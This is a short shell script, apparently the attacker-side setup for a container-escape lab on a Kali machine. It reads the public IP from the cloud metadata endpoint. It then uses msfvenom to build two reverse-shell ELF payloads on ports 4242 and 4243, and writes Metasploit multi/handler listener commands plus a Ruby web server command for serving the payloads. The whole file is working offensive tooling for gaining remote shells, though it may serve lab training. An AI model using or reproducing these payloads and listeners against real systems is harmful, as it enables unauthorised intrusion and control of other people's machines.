#!/bin/sh

PUBLIC_IP=$(curl http://169.254.169.254/latest/meta-data/public-ipv4)
ROOT_DIR=/home/kali/container-escape

mkdir -p $ROOT_DIR

[ ! -f $ROOT_DIR/met-container ] && msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$PUBLIC_IP LPORT=4242 -f elf > $ROOT_DIR/met-container

[ ! -f $ROOT_DIR/met-host ] && msfvenom -p linux/x86/shell/reverse_tcp LHOST=$PUBLIC_IP LPORT=4243 -f elf > $ROOT_DIR/met-host

[ ! -f $ROOT_DIR/msfconsole1 ] && echo "msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'" > $ROOT_DIR/msfconsole1

[ ! -f $ROOT_DIR/msfconsole2 ] && echo "msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell/reverse_tcp;set lhost 0.0.0.0; set lport 4243;run'" > $ROOT_DIR/msfconsole2

[ ! -f $ROOT_DIR/start_ruby_webserver ] && echo "ruby -run -ehttpd . -p8001" > $ROOT_DIR/start_ruby_webserver

chown -R kali:kali $ROOT_DIR

chmod -R +x $ROOT_DIR
